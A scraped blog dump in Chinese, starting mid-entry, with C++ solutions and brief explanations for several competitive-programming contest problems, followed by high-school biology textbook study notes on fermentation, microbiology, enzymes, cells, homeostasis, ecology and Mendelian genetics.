为奇数则可以区分，偶数不能区分。减少询问的数量只会让信息量减少，更不能区分。 是可行的，平民的数量不少于狼的数量，只有一个人一定是平民。 直接判断奇偶性输出。 12345678int main() { int n = read(); if (n &amp; 1) { puts(\"YES\"); } else { puts(\"NO\"); }} C. 蔚蓝 一眼 DP 12int dp[MAXN][MAXN]; // dp[i][j] 前 i 关， a 打了 j 关的答案dp[i][j] = min(dp[i - 1][j - 1] + a[i], dp[i - 1][j] + b[i]); 完整代码： 123456789101112131415161718192021int main() { int n = read(); for (int i = 1; i &lt;= n; i++) { a[i] = read(); } for (int i = 1; i &lt;= n; i++) { b[i] = read(); } memset(dp, INF, sizeof dp); dp[1][1] = a[1]; dp[1][0] = b[1]; for (int i = 2; i &lt;= n; i++) { dp[i][0] = dp[i - 1][0] + b[i]; for (int j = 0; j &lt;= n; j++) { dp[i][j] = min(dp[i - 1][j - 1] + a[i], dp[i - 1][j] + b[i]); } } write(dp[n][n / 2]); putchar(' ');} 贪心 将关卡按照两人用时差异降序排序后贪心选择用时较小的，不难证明贪心正确性，可实现 。 D. 炉石传说 注意到值域较小，直接枚举全体伤害的次数。 1234567891011121314151617181920212223int main() { int n = read(); int x = read(); int y = read(); int max_health = 0; for (int i = 1; i &lt;= n; i++) { a[i] = read(); max_health = max(max_health, a[i]); } int ans = INF; int max_aoe = max_health / x + 1; for (int aoe_times = 0; aoe_times &lt;= max_aoe; aoe_times++) { int cur = aoe_times; for (int i = 1; i &lt;= n; i++) { if (a[i] - x * aoe_times &gt; 0) { cur += ceil(double(a[i] - x * aoe_times) / y); } } ans = min(ans, cur); } cout &lt;&lt; ans &lt;&lt; endl;} E. 马拉松 考虑将所有速度向量对起点直线方向向量做正交投影，则只有垂直于直线方向的速度分量相同，平行分量不同时，才有可能在同一时刻相交。以上结论对所有特殊情况都成立。 可以用内积计算垂直分量和平行分量，由于起点直线的方向向量对所有计算都是相同的，故不需要除以方向向量的长度也能进行比较，可以全部通过整形运算处理。 算法实现可通过双重 map 统计平行和垂直分量都相同的数量，并在统计时减去。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;typedef long long int64;const int INF = 0x3f3f3f3f;const int MAXN = 100010;const int MAXA = 110;int vx[MAXN];int vd[MAXN];int vy[MAXN];int vn[MAXN];#include &lt;cctype&gt;#include &lt;cstdio&gt;template &lt;typename T = int&gt;inline T read() { T X = 0, w = 0; char ch = 0; while (!isdigit(ch)) { w |= ch == '-'; ch = getchar(); } while (isdigit(ch)) { X = (X &lt;&lt; 3) + (X &lt;&lt; 1) + (ch ^ 48); ch = getchar(); } return w ? -X : X;}map&lt;int, map&lt;int, int&gt;&gt; cnt;map&lt;int, int&gt; vnsum;int main() { int n = read(); int a = read(); read(); const int dir_x = 1; const int dir_y = a; const int norm_x = -a; const int norm_y = 1; for (int i = 1; i &lt;= n; i++) { read(); vx[i] = read(); vy[i] = read(); vd[i] = vx[i] * dir_x + vy[i] * dir_y; vn[i] = vx[i] * norm_x + vy[i] * norm_y; cnt[vn[i]][vd[i]]++; vnsum[vn[i]]++; } int64 ans = 0; for (int i = 1; i &lt;= n; i++) { ans += vnsum[vn[i]] - cnt[vn[i]][vd[i]]; } cout &lt;&lt; ans &lt;&lt; endl;} 当心 ans 爆 int。 F. A+B Problem 略。","tags":["oi","比赛"],"categories":["OI"]},{"title":"生物选修一摘要","path":"/2021/3/29/Biology-4/","content":"传统发酵技术的运用 果酒和果醋的制作 酵母菌繁殖温度: 20℃ 酒精发酵温度: 18~25℃ 无需严格灭菌原因: 在缺氧, 酸性的发酵液中, 酵母菌可以生长繁殖, 而绝大多数微生物都因无法使用这一环境而受到抑制 醋酸菌最适生长温度: 30~35℃ 榨汁前先将葡萄清洗, 并除去枝梗: 防止葡萄皮破损, 洗去浮尘, 不反复冲洗防止洗掉葡萄皮上的酵母菌 使用体积分数 70% 酒精消毒或洗洁精擦拭 装瓶时留有三分之一的空间, 供酵母菌有氧呼吸产生大量菌种 检验酒精: 酸性条件下, 重铬酸钾与酒精反应呈现灰绿色 腐乳的制作 原理: 毛霉等微生物产生的蛋白酶能将豆腐中的蛋白质分解成小分子的肽和氨基酸; 脂肪酶可将脂肪水解为甘油和脂肪酸. 在多种微生物的协同作用下, 普通的豆腐转变成风味独特的腐乳 毛霉生长温度: 15~18℃ 加盐作用 析出豆腐中的水分, 使豆腐块变硬 抑制微生物生长, 避免腐败变质 浸提蛋白质 加酒作用: 抑制微生物生长, 使腐乳具有独特的香味 香辛料作用: 调制腐乳的风味, 具有防腐杀菌的作用 制作泡菜并检查亚硝酸盐含量 水盐比例: 4:1 测定亚硝酸盐含量原理: 在盐酸酸化条件下, 亚硝酸盐与对氨基苯磺酸发生重氮化反应后, 与 N-1-萘基乙二胺盐酸盐结合形成玫瑰红色染料 亚硝酸盐含量增加原因: 温度过高, 食盐用量过低, 腌制时间过短, 容易造成细菌大量繁殖 氢氧化钠作用: 中和乳酸 氢氧化铝作用: 吸附色素 微生物的培养与应用 微生物的实验室培养 培养基提供: 水, 碳源, 氮源, 无机盐 培养基要满足微生物生长对 pH, 特殊营养物质以及氧气的要求 无菌技术: 获取纯净培养物的关键是防止外来杂菌的入侵 消毒: 使用较为温和的物理或化学方法杀死物体表面或内部的部分微生物(不包括芽孢和孢子) 灭菌: 使用强烈的理化因素杀死物体内外所有的微生物, 包括芽孢和孢子 煮沸消毒法: 100℃, 5~6min 巴氏消毒法: 75℃, 30min 或 80℃, 15min 干热灭菌: 160~170℃, 1~2h 高压蒸汽灭菌: 100kPa, 121℃, 15~30min 菌落: 由一个细胞繁殖而来的肉眼可见的子细胞群体 平板划线法 平板划线法不能划破: 会造成划线不均匀, 菌落沿划破处生长, 形成条状菌落 测量活菌数量不用平板划线法: 只有最后一次末端才会得到一个活菌的菌落, 其他菌落往往由多个活菌形成, 数目低于实际值 5 个区域, 灼烧 6 次作用: 第一次划线前: 防止污染培养基 每次划线后: 杀死上次残留的微生物, 使下一次画线时菌种全部来源于上一次划线末端, 数量减少, 得到单菌落 最后: 防止污染环境, 操作者 保藏: 临时保藏 (固体斜面培养基), 甘油管藏 尿素分解菌分离和计数 脲酶分解: 脲酶 微生物筛选原理: 人为提供有利于目的菌株生长的条件, 同时抑制或阻止其他微生物的的入侵 稀释平板涂布法原理: 在稀释度足够高的菌液里, 聚集在一起的微生物将被分散成单个细胞, 从而得到单个菌落 稀释平板涂布法计数原理: 当样品的稀释度足够高时, 培养基表面生长的一个菌落, 来源于样品稀释液中的一个活菌 菌落特征: 形状, 大小, 隆起程度和颜色 纤维素分解菌的分离 纤维素酶: 一种复合酶, 包括 酶, 酶和葡萄糖苷酶, 纤维素纤维二糖葡萄糖苷酶葡萄糖 刚果红染色法原理: 刚果红能与培养基中的纤维素形成红色复合物, 当纤维素被纤维素分解菌分解后, 刚果红 - 纤维素的复合物就无法形成, 培养基中会出现以纤维素分解菌为中心的透明圈 选择培养: 增加纤维素分解菌的浓度 NaCl 作用: 漂洗去与纤维素结合不牢的刚果红 发酵产纤维素酶定量测定: 对纤维素酶分解滤纸等纤维素后所产生的葡萄糖进行定量的测定 酶的研究和应用 果胶酶 果胶是植物细胞壁以及胞间层的主要组成成分之一, 是由半乳糖醛酸聚合而成的一种高分子化合物 果胶酶能够分解果胶, 瓦解植物的细胞壁及胞间层, 使榨取果汁变得更容易 果胶酶使分解果胶的一类酶的总称, 包括多聚半乳糖醛酸酶, 果胶分解酶, 果胶酯酶 酶的活性是指酶催化一定化学反应的能力, 酶活性的高低可以用在一定条件下, 酶所催化的某一化学反应的反应速度来表示 加酶洗衣粉 常用酶: 蛋白酶, 脂肪酶, 淀粉酶, 纤维素酶(不分解纤维素, 使纤维素变蓬松) 碱性蛋白酶能将血渍, 奶渍等含有的大分子蛋白质水解成可溶性的氨基酸和小分子肽 酵母细胞固定化 酶应用实际问题 对强酸, 强碱, 高温和有机溶剂等条件非常敏感 很难回收, 不能再次利用, 提高成本 混在产物中影响产品质量 固定化酶和固定化细胞计数是利用物理或化学方法将酶或细胞固定在一定空间内的计数, 包括包埋法, 化学结合法, 物理吸附法 细胞用包埋法, 酶用物理吸附法和化学结合法: 体积大的细胞难以吸附和结合, 体积小的酶容易从包埋材料中脱出 包埋法: 将微生物细胞均匀地包埋在不溶于水的多孔性载体中, 常用载体有明胶, 琼脂糖, 海藻酸钠, 醋酸纤维素和聚丙烯酰胺 制备固定化酵母细胞 酵母细胞的活化 配置 溶液 配置海藻酸钠溶液 浓度太高难以形成凝胶珠 浓度太低酵母细胞数目过少 海藻酸钠溶液和酵母细胞混合 固定化酵母细胞 血红蛋白的提取和分离 蛋白质的各种特性的差异, 如分子的形状和大小, 所带电荷的性质和多少, 溶解度, 吸附性质和对其他分子的亲和力等等可以用来分离不同种类的蛋白质 凝胶色谱法也称作分配色谱法, 是根据相对分子质量大小分离蛋白质的有效办法 凝胶色谱法原理: 相对分子质量较小的蛋白质容易进入凝胶内部的通道, 路程较长, 移动速度较慢; 相对分子质量较大的蛋白质无法进入凝胶内部的通道, 路程较短, 移动速度较快 缓冲溶液: 在一定范围内, 能抵制外界的酸和碱对溶液 pH 的影响, 维持 pH 基本不变 缓冲溶液意义: 在实验室条件下准确模拟生物体内的过程 电泳:　带电粒子在电场作用下发生迁移的过程, 利用了待分离样品中各种分子带电性质的差异以及分子本身的大小, 形状的不同, 使带电分子产生不同的迁移速度 常用电泳方法: 琼脂糖凝胶电泳, 聚丙烯酰胺凝胶电泳, SDS - 聚丙烯酰胺凝胶电泳(SDS 所带负电荷的量掩盖了不同种蛋白质间的电荷差别, 使电泳迁移率完全取决于分子的大小) 样品处理和粗分离 红细胞的洗涤 血红蛋白的释放 分离血红蛋白溶液 有机溶剂 脂类物质 血红蛋白溶液 红细胞破碎物沉淀 透析 凝胶色谱操作 装填时不得有气泡存在, 气泡会扰乱洗脱次序, 降低分离效果 不能发生洗脱液流干, 露出凝胶颗粒的现象 如果红色区带均匀一致的移动, 说明色谱柱制作成功 植物有效成分提取 植物芳香油主要包括萜类化合物及其衍生物 水蒸气蒸馏法 原理: 利用水蒸气将挥发性较强的植物芳香油携带出来, 形成油水混合物, 冷却后分层 缺点: 原料焦糊, 有效成分水解 玫瑰精油性质: 性质稳定, 难溶于水, 易溶于有机溶剂, 能随水蒸气一同蒸馏 蒸馏温度太高, 时间太短, 产品品质就比较差, 要提高品质就要延长蒸馏时间 步骤: 12鲜玫瑰花 + 清水 ==&gt; 水蒸气蒸馏 ==&gt; 油水混合物 == 加入 NaCl ==&gt;分离油层 == 加入无水 Na2SO4 ==&gt; 除水 ==&gt; 过滤 压榨法: 作用: 破坏细胞结构, 分解果胶, 防止橘皮压榨时滑脱 步骤: 1石灰石浸泡 ==&gt; 漂洗 ==&gt; 压榨 ==&gt; 过滤 ==&gt; 静置 ==&gt; 再次过滤 ==&gt; 橘皮油 萃取法: 将粉碎干燥的植物原料用有机溶剂浸泡, 使芳香油溶解在有机溶剂中的方法 水溶性萃取剂: 乙醇, 丙酮 水不溶性萃取剂: 石油醚, 乙酸乙酯, 乙醚, 苯, 四氯化碳 应具有性质: 具有较高沸点, 能够充分溶解胡罗卜素, 并且不与水混溶 考虑方面: 萃取效率, 对人的毒性, 是否易燃, 能否从产品中完全除去, 会不会影响产品质量 萃取的效率主要取决于萃取剂的性质和使用量, 还受到原料颗粒的大小, 紧密程度, 含水量, 萃取的温度和时间等条件的影响 应避免明火加热, 采用水浴加热, 防止引起燃烧爆炸 步骤: 1胡萝卜 ==&gt; 粉碎 ==&gt; 干燥 ==&gt; 萃取 ==&gt; 过滤 ==&gt; 浓缩 ==&gt; 胡罗卜素","tags":["文化课","生物"],"categories":["课程"]},{"title":"高中生物必修一教材整理","path":"/2021/3/19/Biology-1/","content":"知识点 科学家根据细胞内有无以核膜为界限的细胞核，把细胞分为真核细胞和原核细胞两大类。 蓝藻细胞内含有藻蓝素和叶绿素, 是能进行光合作用的自养生物. 细胞学说 细胞是一个有机体, 一切动植物都由细胞发育而来, 并由细胞和细胞产物构成. 细胞是一个相对独立的单位, 既有他自己的生命, 又对与其他细胞共同组成的整体的生命起作用. 新细胞可以从老细胞中产生. —- 施莱登. 施旺 细胞通过分裂产生新细胞. —- 魏尔肖 氨基酸是组成蛋白质的基本单位。 一切生命活动都离不开蛋白质，蛋白质是生命活动的主要承担者。 蛋白质功能: 构成细胞和生物体结构, 酶的催化, 运输载体, 信息传递, 免疫功能 核酸是细胞内携带遗传信息的物质，在生物体的遗传, 变异和蛋白质的生物合成中具有极其重要的作用。 真核生物的 DNA主要分布在细胞核中, RNA主要分布在细胞质中. 糖类是主要的能源物质。 不能水解的糖类就叫单糖 二糖必须水解成单糖才能被细胞吸收 生物体内的糖类绝大对数以多糖()的形式存在. 构成所有植物细胞的细胞壁的主要成分都是纤维素. 脂肪是细胞内良好的储能物质。 每一个单体都以若干个相连的碳原子构成的碳链为基本骨架，由许多单体连接成多聚体。 生物大分子以碳链为骨架 水在细胞中以两种形式存在。一部分与细胞内的其他物质相结合，叫做结合水。细胞中绝大部分的水以游离的形式存在，可以自由流动，叫做自由水。 细胞内的良好溶剂 许多生物化学反应都需要水的参与 生物体的绝大多数细胞, 必须浸润在以水为基础的液体环境中 把营养物质运送到各个细胞 把废物运送到排泄器官或直接排出体外 细胞中大多数无机盐以离子的形式存在。 构成复杂化合物 对维持细胞和生物体的生命活动有重要作用 维持酸碱平衡, 渗透压平衡 细胞膜主要由脂质和蛋白质组成。 细胞在癌变的过程中, 细胞膜的成分发生改变, 有的产生甲胎蛋白(AFP), 癌胚抗原(CEA)等物质 细胞膜的功能：将细胞与外界环境分隔开；控制物质进出细胞；进行细胞间的信息交流。 细胞膜的控制作用是相对的: 环境中一些对细胞有害的物质有可能进入; 有些病毒, 细菌也能侵入细胞, 使生物体患病. 细胞器膜和细胞膜. 核膜等结构，共同构成细胞的生物膜系统。 细胞器 描述 线粒体 有氧呼吸的主要场所 叶绿体 绿色植物能进行光合作用的细胞含有的细胞器 内质网 蛋白质合成和加工, 脂质合成 高尔基体 对来自内质网的蛋白质进行加工, 分类, 包装 核糖体 生产蛋白质的机器 溶酶体 分解衰老损伤的细胞器, 吞噬杀死侵入细胞的细菌病毒 液泡 调节植物细胞内的环境, 使植物细胞保持坚挺 中心体 与细胞的有丝分裂有关 细胞质基质: 代谢的主要场所, 为新陈代谢提供需要的物质和一定环境 生物膜系统 细胞膜不仅使细胞具有一个相对稳定的内部环境, 同时在细胞与外部环境进行物质运输, 能量转换和信息传递的过程中起决定性作用 广阔的膜面积为多种酶提供了大量的附着位点 使细胞区室化, 使得细胞内能够同时进行多种化学反应, 而不会互相干扰, 保证了细胞生命活动高效有序进行 细胞核控制着细胞的代谢和遗传。 除高等植物成熟的筛管细胞和哺乳动物成熟的红细胞等极少数细胞外, 真核细胞都有细胞核 细胞核是遗传信息库，是细胞代谢和遗传的控制中心。 细胞既是生物体结构的基本单位, 也是生物体代谢和遗传的基本单位. 细胞膜和其他生物膜都是选择透过性膜。 细胞的吸水和失水是水分子顺相对含量的梯度跨膜运输的过程 物质通过简单的扩散作用进出细胞，叫做自由扩散；进出细胞的物质借助载体蛋白的扩散，叫做协助扩散；物质从低浓度一侧运输到高浓度一侧，需要载体蛋白的协助，同时还需要消耗细胞内化学反应所释放的能量，这种方式叫做主动运输。 主动运输普遍存在于动植物和微生物细胞中, 保证了活细胞能够按照生命活动的需要, 主动选择吸收所需要的营养物质, 排除代谢废物和对细胞有害的物质. 细胞中每时每刻都进行着许多化学反应，统称为细胞代谢。 分子从常态转变为容易发生化学反应的活跃状态所需要的能量称为活化能。 同无机催化剂相比，酶降低活化能的作用更显著，因而催化效率更高。 酶是活细胞产生的具有催化作用的有机物，其中绝大多数酶是蛋白质。 酶所催化的化学反应一般是在比较温和的条件下进行的。 酶具有高效性, 专一性, 酶的作用条件较温和 ATP是细胞内的一种高能磷酸化合物。 细胞呼吸是指有机物在细胞内经过一系列的氧化分解，生成二氧化碳或其他产物，释放出能量并生成ATP的过程。 有氧呼吸是指细胞在氧的参与下，通过多种酶的催化作用，把葡萄糖等有机物彻底氧化分解，产生二氧化碳和水，释放能量，生成许多ATP的过程。 酶能量 酵母菌, 乳酸菌等微生物的无氧呼吸也叫做发酵 酶乳酸少量能量 酶酒精少量能量 叶绿素a和叶绿素b主要吸收蓝紫光和红光，胡萝卜素和叶黄素主要只吸收蓝紫光。 绿叶中的色素能够溶解在有机溶剂无水乙醇中, 所以可以用无水乙醇提取绿叶中的色素 它们在层析液中的溶解度不同, 溶解度高的随层析液在滤纸上扩散的快; 反之则慢. 吸收光能的四种色素就分布在类囊体的薄膜上。 叶绿体是进行光合作用的场所。它内部的巨大膜表面上，不仅分布着许多吸收光能的色素分子，还有许多进行光合作用所必需的酶。 光合作用是指绿色植物通过叶绿体，利用光能，把二氧化碳和水转化成储存着能量的有机物，并且释放出氧气的过程。 叶绿体光能 化能合成作用: 利用体外环境的某些无机物氧化时所释放的能量来制造有机物 光反应阶段：光合作用第一个阶段中的化学反应，必须有光才能进行。这个阶段叫做光反应阶段。 暗反应阶段：光合作用第二个阶段中的化学反应，有没有光都可以进行，这个阶段叫做暗反应阶段。 细胞表面积与体积的关系限制了细胞的长大。 细胞增殖是重要的细胞生命活动, 是生物体生长, 发育, 繁殖, 遗传的基础 细胞在分裂之前，必须进行一定的物质准备。细胞增殖包括物质准备和细胞分裂整个连续的过程。 连续分裂的细胞，从一次分裂完成时开始，到下一次分裂完成时为止，为一个细胞周期。 细胞有丝分裂的重要意义, 是将亲代细胞的染色体经过复制 (实质为 DNA 的复制) 之后, 精确的平均分配到两个子细胞中. 由于染色体上有遗传物质 DNA, 因而在细胞的亲代和子代之间保持了遗传性状的稳定性. 细胞的有丝分裂对于生物的遗传有重要意义 在个体发育中，由一个或一种细胞增殖产生的后代，在形态, 结构和生理功能上发生稳定性差异的过程，叫做细胞分化。 细胞分化是生物界中普遍存在的生命现象, 是生物个体发育的基础 细胞分化使多细胞生物的细胞趋向专门化, 有利于提高各种生理功能的效率 原因: 在个体发育的过程中, 不同的细胞中遗传信息的执行情况不同 细胞的全能性是指已经分化的细胞，仍然具有发育成完整个体的潜能。 由基因所决定的细胞自动结束生命的过程，就叫细胞凋亡。 在成熟的生物体中, 细胞的自然更新, 被病原体感染的细胞的清除, 也是通过细胞凋亡完成的. 细胞凋亡对于多细胞生物体完成正常发育, 维持内部环境的稳定, 以及抵御外界各种因素的干扰都起着非常关键的作用. 有的细胞受到致癌因子的作用，细胞中遗传物质发生变化，就变成不受机体控制的, 连续进行分裂的恶性增殖细胞，这种细胞就是癌细胞。 在适宜的条件下, 癌细胞能够无线增殖 癌细胞的形态结构发生显著变化 癌细胞的表面发生了变化 原癌基因主要负责调节细胞周期, 控制细胞生长和分裂的进程 抑癌基因主要是组织细胞不正常的增殖 实验 模型: 为了某种特定目的而对认识对象所作的一种简化的概括性描述 控制变量 实验中可以变化的因素称为变量 人为改变的称作自变量 随着自变量变化而变化的变量称作因变量 除自变量外, 实验过程中可能还会存在一些可变因素, 对实验结果造成影响, 这些变量称为无关变量 对比试验: 设置两个或两个以上的实验组, 通过对结果的比较分析, 来探究某种因素与实验对象的关系","tags":["文化课","生物"],"categories":["课程"]},{"title":"高中生物必修三教材整理","path":"/2021/3/19/Biology-3/","content":"内环境与稳态 不论男性还是女性，体内都含有大量以水为基础的液体，这些液体统称为体液。 血浆是血细胞直接生活的环境 组织液是存在于组织细胞间隙的液体, 又叫细胞间隙液. 组织液是体内绝大多数血细胞直接生活的环境 淋巴中混悬着大量的淋巴细胞和吞噬细胞等, 可以协助机体抵御疾病, 对这些细胞来说, 淋巴就是它们直接生活的环境 由细胞外液构成的液体环境叫做内环境。 细胞外液在本质上是一种盐溶液, 类似于海水, 这在一定程度上反映了生命起源于海洋 溶液渗透压的大小取决于单位体积溶液中溶质微粒的数目 血浆渗透压的大小主要与无机盐, 蛋白质的含量有关 细胞外液渗透压 90% 以上来源于 和 正常人的血浆近中性, pH 为 7.35~7.45 内环境是细胞与外界环境进行物质交换的媒介 正常机体通过调节作用，使各个器官、系统协调活动，共同维持内环境的相对稳定状态叫做稳态。 健康人的内环境的每一种成分和理化性质都处于动态平衡中 神经-体液-免疫调节网络是机体维持稳态的主要调节机制 内环境稳态是机体进行正常生命活动的必要条件。 动物和人体生命活动的调节 兴奋是指动物体或人体内的某些组织（如神经组织）或细胞感受外界刺激后，由相对静止状态变为显著活跃状态的过程。 神经调节的基本方式是反射, 它是指在中枢神经系统参与下, 动物体或人体对内外环境变化做出的规律性应答. 完成反射的结构基础是反射弧. 反射弧通常由感受器, 传入神经, 神经中枢, 传出神经, 效应器 (传出神经末梢和它所支配的肌肉或腺体等) 反射活动需要经过完整的反射弧实现, 如果反射弧中任何环节在结构或功能上受损, 反射就不能完成 兴奋是以电信号的形式沿着神经纤维传导的, 这种电信号也叫神经冲动 由于神经递质只能由突触前膜释放, 然后作用于突触后膜, 因此神经元之间的传递只能是单方向的 人的大脑皮层除了对外部世界的感知以及控制机体的反射活动外，还具有语言、学习、记忆和思维等方面的高级功能。 一般来说, 位于脊髓的低级中枢受脑中相应的高级中枢的调控 学习和记忆涉及脑内神经递质的作用以及某些种类蛋白质的合成 由内分泌器官（或细胞）分泌的化学物质进行调节，这就是激素调节。 胰岛素能促进组织细胞加速摄取, 利用和储存葡萄糖, 从而使血糖水平降低 胰高血糖素能促进糖原分解, 并促使一些非糖物质转化为糖, 从而使血糖水平升高 甲状腺激素随血液运到全身, 几乎作用于机体所有的细胞, 提高细胞代谢的速率, 使机体产生更多的热量 在一个系统中，系统本身工作的效果，反过来又作为信息调节该系统的工作，这种调节方式叫做反馈调节。反馈调节是生命系统中非常普遍的调节机制，它对于机体维持稳态具有重要意义。 激素调节的特点：微量和高效、通过体液运输、作用于靶器官或靶细胞。 激素等化学物质 (除激素以外, 还有其他调节因子, 如 等), 通过体液运送的方式对生命活动进行调节, 称为体液调节. 激素调节是体液调节的主要内容 神经调节和体液调节之间的关系: 不少内分泌腺本身直接或间接地受中枢神经系统的调节, 体液调节可以看作神经调节的一个环节 内分泌腺所分泌的激素也可以影响神经系统的发育和功能 免疫器官: 免疫细胞生成, 成熟或集中分布的场所 免疫细胞: 发挥免疫作用的细胞 免疫活性物质 (抗体, 淋巴因子, 溶菌酶等): 由免疫细胞或其他细胞产生的发挥免疫作用的物质 能够引起机体产生特异性免疫反应的物质叫做抗原 病毒, 细菌等病原体表面的蛋白质等物质, 都可以作为引起免疫反应的物质 抗体可以与病原体结合, 从而抑制病原体的繁殖或对人体细胞的黏附 效应 T 细胞可以与被抗原入侵的宿主细胞密切接触, 使这些细胞裂解死亡 将自身物质当作外来异物进行攻击, 这类疾病就是自身免疫病 过敏反应是指已产生免疫的机体, 在再次接受相同抗原时所发生的组织损伤或功能紊乱. 发作迅速, 反应强烈, 消退较快 一般不会破坏组织细胞, 不会引起组织严重损伤 有明显的遗传倾向和个体差异 监控和清除功能: 监控并清除体内已经衰老的细胞或因其他因素而被破坏的细胞, 以及癌变的细胞 植物的激素调节 在单侧光的照射下, 植物朝向光源方向生长的现象叫做向光性 科学家 结论 达尔文 传递某种影响 鲍森詹森 影响可以透过琼脂片传递给下部 拜尔 弯曲生长是尖端影响在其下部分布不均匀造成的 温特 证明胚芽鞘的弯曲生长确实是一种化学物质造成的, 命名生长素 1931年 从人尿分离 IAA 1946年 从高等植物分离生长素 由植物体内产生，能从产生部位运送到作用部位，对植物的生长发育有显著影响的微量有机物，称作植物激素。 生长素的作用表现出两重性：既能促进生长，也能抑制生长；既能促进发芽，也能抑制发芽；既能防止落花落果，也能疏花疏果。 人工合成的对植物的生长发育有调节作用的化学物质称为植物生长调节剂。 生长素: 吲哚乙酸 IAA, 苯乙酸 PAA, 吲哚丁酸 IBA 生长素类似物: 萘乙酸 NAA, , IPA, IBA, 生根粉 其他植物激素 合成部位 主要作用 赤霉素 GA 主要是未成熟的种子, 幼根和幼芽 促进细胞伸长, 从而引起植株增高; 促进种子萌发和果实发育 细胞分裂素 CTK 主要是根尖 促进细胞分裂 脱落酸 ABA 根冠, 萎蔫的叶片等, 将要脱落的器官分布多 抑制细胞分裂, 促进叶和果实的衰老和脱落 乙烯 植物体各个部位 促进果实成熟 激素调节在植物的生长发育和对环境的适应过程中发挥着重要作用 植物的生长发育过程, 在根本上是基因组在一定的时间和空间上程序性表达的结果 种群和群落 种群在单位面积或单位体积中的个体数是种群密度。种群密度是种群最基本的数量特征。 出生率是指在单位时间内新产生的个体数目占该种群个体总数的比率 死亡率是指在单位时间内死亡的个体数目占该种群个体总数的比率 迁入率, 迁出率是指在单位时间内迁入, 迁出的个体数目占该种群个体总数的比率 年龄结构是指一个种群中各年龄期的个体数目的比例 性别比例是之种群中雌雄个体数目的比例 组成种群的个体, 在其空间中的位置状态或布局叫做种群的空间特征 自然界确有类似细菌在理想条件下种群数量增长的形式，如果以时间为横坐标，种群数量为纵坐标画出曲线来表示，曲线则大致呈“J”型。 模型假设: 食物和空间充足, 气候适宜, 没有敌害 种群经过一定时间的增长后，数量趋于稳定的增长曲线，称为“S”型曲线。 成因: 自然界的资源和空间总是有限的, 当种群密度增大时, 种内竞争就会加剧, 以该物种为食的动物的数量就会增加, 这就会使种群的出生率降低, 死亡率升高. 当死亡率增加啊到与出生率相等时, 种群的增长就会停止 在环境条件不受破坏的情况下，一定空间中所能维持的种群最大数量称为环境容纳量，又称K值。 同一时间内聚集在一定区域中各种生物种群的集合，叫做群落。 群落的物种组成是区别不同群落的重要特征 群落中物种数目的多少称为丰富度。 捕食: 一种生物以另一种生物为食 竞争: 两种或两种以上的生物相互争夺资源和空间等 结果常表现为相互抑制, 有时表现为一方占优势, 一方处于劣势甚至灭亡 寄生: 一种生物寄居于另一种生物的体内或体表, 摄取寄主的养分以维持生活 互利共生: 两种生物共同生活在一起, 相互依存, 彼此有利 垂直结构意义 显著提高了群落利用阳光等自然资源的能力 为动物创造了多种多样的栖息空间和食物条件 随着时间的推移，一个群落被另一个群落代替的过程，就叫做演替。 初生演替是指在一个从来没有被植物覆盖的地面, 或者是原来存在过植被, 但被彻底消灭了的地方发生的演替 次生演替是指在原有植被虽已不存在, 但原有土壤条件基本保留, 甚至还保留了植物的种子或其他繁殖体的地方发生的演替 生态系统及其稳定性 由生物群落与它的无机环境相互作用而形成的统一整体，叫做生态系统。 生产者通过光合作用, 把太阳能固定在他们所制造的有机物中 生产者可以说是生态系统的基石 消费者的存在, 能 加快生态系统的物质循环 对植物的传粉和种子的传播具有重要作用 分解者能将动植物的遗体和排遗物分解成无机物 许多食物链彼此相互交错连接成的复杂营养结构，就是食物网。 生态系统的能量流动是单向的 捕食关系由长期的自然选择形成, 不可逆转 散失热量不能被生物群系重复利用, 不可循环 能量在流动过程中逐级递减 呼吸作用消耗大部分能量 用于生长发育繁殖的能量一部分流入分解者, 一部分未被利用 研究生态系统的能量流动, 可以 帮助人们科学规划, 设计人工生态系统, 使能量得到最有效的利用 实现对能量的多级利用, 从而大大提高能量的利用率 帮助人们合理地调整生态系统的能量流动关系, 使能量持续高效地流向对人类最有益的部分 组成生物体的C、H、O、N、P、S等元素，都不断进行着从无机环境到生物群落，又从生物群落到无机环境的循环过程，这就是生态系统的物质循环。 物质作为能量的载体, 使能量沿着食物链 (网) 流动 能量作为动力, 使物质能够不断地在生物群落和无机环境之间循环往返 生命活动的正常进行，离不开信息的作用；生物种群的繁衍，也离不开信息的传递。 信息还能够调节生物的种间关系，以维持生态系统的稳定。 生态系统所具有的保持或恢复自身结构和功能相对稳定的能力，叫做生态系统的稳定性。 负反馈调节在生态系统中普遍存在，它是生态系统自我调节能力的基础。 抵抗力稳定性: 生态系统抵抗外界干扰并使自身的结构和功能保持原状(不受损害)的能力 恢复力稳定性: 生态系统在受到外界干扰因素的破坏后恢复到原状的能力 生态环境的保护 全球性生态环境问题主要包括全球气候变化、水资源短缺、臭氧层破坏、酸雨、土地荒漠化、海洋污染和生物多样性锐减等。 生物圈内所有的植物、动物和微生物，它们所拥有的全部基因以及各种各样的生态系统，共同构成了生物多样性。 生物多样性的价值有潜在价值、间接价值、直接价值。 可持续发展的含义是在不牺牲未来几代人需要的情况下，满足我们这代人的需要，它追求的是自然、经济、社会的持久而协调的发展。","tags":["文化课","生物"],"categories":["课程"]},{"title":"高中生物必修二教材整理","path":"/2021/3/19/Biology-2/","content":"孟德尔遗传定律 一种生物的同一种性状的不同表现类型, 叫做相对性状. 孟德尔对分离现象的假说 生物的性状是由遗传因子决定的, 遗传因子不会相互融合, 也不会在传递中消失 体细胞中的遗传因子是成对存在的 形成配子时, 成对的遗传因子彼此分离, 分别进入不同的配子中 受精时, 雌雄配子的结合是随机的 假说演绎法: 在观察和分析的基础上提出问题以后, 通过推理和想象提出解释问题的假说, 根据假说进行演绎推理, 再通过实验检验演绎推理的结果 分离定律：在生物的体细胞中，控制同一性状的遗传因子成对存在，不相融合；在形成配子时，成对的遗传因子发生分离，分离后的遗传因子分别进入不同的配子中，随配子遗传给后代。 孟德尔对自由组合现象的解释: 在产生配子时. 每对遗传因子彼此分离, 不同对的遗传因子可以自由组合 自由组合定律：控制不同性状的遗传因子的分离和组合是互不干扰的；在形成配子时，决定同一性状的成对的遗传因子彼此分离，决定不同性状的遗传因子自由组合。 表现型指生物个体表现出来的性状, 与表现型有关的基因组成叫做基因型 减数分裂和伴性遗传 